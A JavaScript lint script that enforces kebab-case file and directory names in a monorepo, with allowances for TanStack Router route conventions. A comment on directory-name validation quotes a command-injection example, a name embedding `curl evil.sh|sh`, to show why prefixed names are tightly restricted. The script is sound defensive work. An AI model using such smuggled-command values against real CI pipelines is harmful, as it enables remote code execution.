import { readdir } from "node:fs/promises";
import path from "node:path";

const ROOT_DIR = process.cwd();
const DEFAULT_TARGETS = ["apps", "packages"];

const targets = process.argv.slice(2);
const searchRoots = targets.length > 0 ? targets : DEFAULT_TARGETS;

const ignoredDirs = new Set([
  ".git",
  ".next",
  ".output",
  ".turbo",
  ".claude",
  "generated",
  "node_modules",
  "dist",
  "dist-types",
  "build",
  "coverage",
  "temp",
  // Playwright の e2e 実行時生成物。失敗シナリオ名(日本語)がそのままディレクトリ名になる
  // ため、ディレクトリ名検証を追加した際に誤検知することが分かった。
  "test-results",
  "ui-shadcn",
  "drizzle",
  "migrations",
  "prisma",
]);

const kebabCasePattern = /^[a-z0-9]+(?:-[a-z0-9]+)*$/;
const allowedBaseNames = new Set(["README", "AGENTS", "Dockerfile", "Makefile", "$"]); // $ は TanStack Start の catch-all route
const allowedSuffixes = [".test", ".spec", ".gen"];
// TanStack Router convention: __root.tsx and _layout.tsx are required by the framework
const allowedPrefixes = ["__", "_"];

const violations = [];

const shouldSkipEntry = (entryName) => entryName.startsWith(".");

// TanStack Router の動的ルートパラメータ($shopId 等)はパラメータ名が camelCase になる
// フレームワーク規約のため、ルートディレクトリ配下に限り "$" 始まりセグメントを許容する。
// 名前なしの "$" 単独は catch-all(splat)セグメント — flat route 記法では
// `line.$.tsx` のようにファイル名の途中に現れるため、basename 全体が "$" の場合
// (allowedBaseNames)だけでは足りない(flat route 記法の splat 対応)。
const routeParamPattern = /^\$(?:[a-z][a-zA-Z0-9]*)?$/;
// TanStack Router の非入れ子エスケープ(親セグメント名の末尾アンダースコア、例:
// items.list_.history.tsx)。このアンダースコアは実 URL には現れず、
// 「直前のセグメント名を持つファイルを親レイアウトとみなさない」という配線指示のみを表す
// (入れ子誤配線の防止)。同じ指示は動的パラメータのセグメントにも付く(例:
// items.$itemId_.photos.tsx)。
const nonNestedSegmentPattern = /^(?:[a-z0-9]+(?:-[a-z0-9]+)*|\$[a-z][a-zA-Z0-9]*)_$/;
const isRouteFile = (fullPath) => fullPath.includes(`${path.sep}app${path.sep}routes${path.sep}`);
const isKebabCase = (name, fullPath) =>
  name
    .split(".")
    .every(
      (segment) =>
        kebabCasePattern.test(segment) ||
        (isRouteFile(fullPath) &&
          (routeParamPattern.test(segment) || nonNestedSegmentPattern.test(segment))),
    );

// ディレクトリ名の検証。mutation-diff.sh が features/ 直下のディレクトリ名をクォートせず
// Stryker のコマンド文字列へ連結し exec するため、細工したディレクトリ名(例: `x$(...)`)が
// CI 上のコマンド実行になりうる(セキュリティ監査由来)。ファイルと同じ許容を適用する:
// フレームワーク規約の `_layout` / `__tests__` 等の接頭辞と、ルート配下の動的パラメータ($shopId)。
//
// 接頭辞に一致しただけで残りの文字を検証しない実装だと、`_$(curl evil.sh|sh)` のような
// 名前が prefix 一致(startsWith("_"))だけで通過してしまい、二重防御の一枚が実質無効化する
// 。接頭辞が付く名前は英数字とアンダースコアのみに制限する
// (`__tests__` / `_authenticated` / `__selftest_ports` 等、現行の全ディレクトリ名がこの形)。
const allowedPrefixDirNamePattern = /^[a-zA-Z0-9_]+$/;
const isAllowedDirName = (name, fullPath) =>
  (allowedPrefixes.some((prefix) => name.startsWith(prefix)) &&
    allowedPrefixDirNamePattern.test(name)) ||
  isKebabCase(name, fullPath);

const walk = async (dirPath) => {
  const entries = await readdir(dirPath, { withFileTypes: true });

  for (const entry of entries) {
    if (shouldSkipEntry(entry.name)) {
      continue;
    }

    const fullPath = path.join(dirPath, entry.name);

    if (entry.isDirectory()) {
      if (ignoredDirs.has(entry.name)) {
        continue;
      }
      if (!isAllowedDirName(entry.name, fullPath)) {
        violations.push(path.relative(ROOT_DIR, fullPath));
      }
      await walk(fullPath);
      continue;
    }

    if (!entry.isFile()) {
      continue;
    }

    // Skip auto-generated files
    if (entry.name.endsWith(".gen.ts") || entry.name.endsWith(".gen.tsx")) {
      continue;
    }

    const baseName = path.basename(entry.name, path.extname(entry.name));
    if (allowedBaseNames.has(baseName)) {
      continue;
    }

    const matchedSuffix = allowedSuffixes.find((suffix) => baseName.endsWith(suffix));
    const normalizedBaseName = matchedSuffix ? baseName.slice(0, -matchedSuffix.length) : baseName;

    if (allowedPrefixes.some((prefix) => normalizedBaseName.startsWith(prefix))) {
      continue;
    }
    if (!isKebabCase(normalizedBaseName, fullPath)) {
      violations.push(path.relative(ROOT_DIR, fullPath));
    }
  }
};

const run = async () => {
  for (const target of searchRoots) {
    const fullTargetPath = path.join(ROOT_DIR, target);
    await walk(fullTargetPath);
  }

  if (violations.length === 0) {
    console.log("✅ kebab-case check passed");
    return;
  }

  console.error("❌ Found non-kebab-case filenames:");
  for (const filePath of violations) {
    console.error(`- ${filePath}`);
  }
  process.exit(1);
};

await run();
